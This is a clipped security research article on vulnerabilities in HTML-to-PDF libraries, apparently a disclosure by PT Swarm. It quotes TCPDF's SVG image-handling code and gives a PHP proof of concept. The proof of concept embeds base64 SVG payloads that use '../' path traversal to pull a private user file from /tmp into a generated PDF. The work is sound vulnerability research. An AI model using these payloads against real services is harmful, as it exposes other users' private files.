---
title: "Blind trust: what is hidden behind the process of creating your PDF file?"
source: "https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/"
author:
  - "Aleksey Solovev"
  - "Nikita Sveshnikov"
  - "Vladimir Razov"
published: 2025-12-29
created: 2026-01-02
description: "Every day, thousands of web services generate PDF (Portable Document Format) files—bills, contracts, reports. This step is often treated as a technical routine, “just convert the HTML,” but in practice it’s exactly where a trust boundary is crossed. The renderer parses HTML, downloads external resources, processes fonts, SVGs, and images, and sometimes has access to […]"
tags:
  - "clippings/articles"
  - "_inbox"
---
# Blind trust: what is hidden behind the process of creating your PDF file?

![](https://swarm.ptsecurity.com/wp-content/uploads/2025/12/b1a475dc-64bc-7fb3-be26-bcdc4bc1db99.png)

> [!summary]
> > This article presents a security analysis of popular HTML-to-PDF libraries in PHP, JavaScript, and Java, uncovering 13 vulnerabilities, 7 intentional behaviors, and 6 potential misconfigurations.
> The identified issues include Files or Directories Accessible to External Parties, Deserialization of Untrusted Data, Server-Side Request Forgery (SSRF), and Denial of Service (DoS).
> Specific libraries examined are TCPDF, html2pdf, jsPDF, mPDF, snappy, dompdf, and OpenPDF.
> For TCPDF, path traversal vulnerabilities (with patch bypasses), deserialization leading to arbitrary file deletion, and blind SSRF were demonstrated.
> html2pdf showed deserialization via Phar archives (leveraging TCPDF's POP chain), and multiple blind SSRF vectors through CSS and image tags.
> jsPDF was found vulnerable to Regular Expression Denial of Service (ReDoS) and a DoS via an unreachable loop condition.
> mpdf/mpdf, KnpLabs/snappy, dompdf/dompdf, and LibrePDF/OpenPDF exhibited intentional behaviors or misconfigurations allowing SSRF, local file access, and even remote code execution in some cases.
> The research emphasizes that PDF generation often crosses trust boundaries, making these libraries critical points for security incidents if not properly managed.
> Recommendations include keeping libraries updated, sanitizing all untrusted input, and understanding the security implications of intentional features and default configurations.

Every day, thousands of web services generate PDF (Portable Document Format) files—bills, contracts, reports. This step is often treated as a technical routine, “just convert the HTML,” but in practice it’s exactly where a trust boundary is crossed. The renderer parses HTML, downloads external resources, processes fonts, SVGs, and images, and sometimes has access to the network and the file system. Risky behavior can occur by default, without explicit options or warnings. That is enough for a PDF converter to become an SSRF proxy, a data leak channel, or even cause denial of service.

We therefore conducted a targeted analysis of popular HTML-to-PDF libraries written in the PHP, JavaScript, and Java languages: TCPDF, html2pdf, jsPDF, mPDF, snappy, dompdf, and OpenPDF. During the research, the PT Swarm team identified **13 vulnerabilities,** demonstrated **7 intentional behaviors**, and highlighted **6 potential misconfigurations.** These included vulnerability classes such as **Files or Directories Accessible to External Parties**, **Deserialization of Untrusted Data**, **Server-Side Request Forgery**, and **Denial of Service**.

In this article, we present a threat model for an HTML-to-PDF library, walk through representative findings for each library, and provide PoC snippets.

`<?php  class TCPDF {   ...   protected function startSVGElementHandler($parser, $name, $attribs, $ctm=array()) {     ...     // process tag     switch($name) {       ...       // image       case 'image': {         ...         if (!isset($attribs['xlink:href']) OR empty($attribs['xlink:href'])) {           break;         }         ...         $img = $attribs['xlink:href']; // marker 1         if (!$clipping) {           ...           if (preg_match('/^data:image\/[^;]+;base64,/', $img, $m) > 0) {             ...           } else {             // fix image path             if (!TCPDF_STATIC::empty_string($this->svgdir) AND (($img[0] == '.') OR (basename($img) == $img))) {               // replace relative path with full server path               $img = $this->svgdir.'/'.$img;             }             if (($img[0] == '/') AND !empty($_SERVER['DOCUMENT_ROOT']) AND ($_SERVER['DOCUMENT_ROOT'] != '/')) { // marker 2               $findroot = strpos($img, $_SERVER['DOCUMENT_ROOT']);               if (($findroot === false) OR ($findroot > 1)) {                 if (substr($_SERVER['DOCUMENT_ROOT'], -1) == '/') {                   $img = substr($_SERVER['DOCUMENT_ROOT'], 0, -1).$img;                 } else {                   $img = $_SERVER['DOCUMENT_ROOT'].$img;                 }               }             }             $img = urldecode($img); // marker 3             $testscrtype = @parse_url($img);             ...           }           ...         }         break;       }       ...     }     ...   }   ... }`

##### Exploitation

`<?php     require __DIR__ . '/vendor/autoload.php';      $payload = <<<payload         <html>             <body>                 <img width="589px" height="415px" src="data:image/svg;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICAgPGltYWdlIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHhsaW5rOmhyZWY9Ii4uLy4uLy4uLy4uLy4uLy4uL3RtcC91c2VyX2ZpbGVzL3VzZXJfMS9wcml2YXRlX2ltYWdlLnBuZyIgLz4KPC9zdmc+">                 <img width="589px" height="415px" src="data:image/svg;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICAgPGltYWdlIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHhsaW5rOmhyZWY9Ii8uLi8uLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIC8+Cjwvc3ZnPg==">             </body>         </html>     payload;      $pdf = new TCPDF('P', 'mm', 'A4', true, 'UTF-8', false);     $pdf->AddPage();     $pdf->writeHTML($payload);     $pdf->Output('./generated_file.pdf', 'I'); ?>`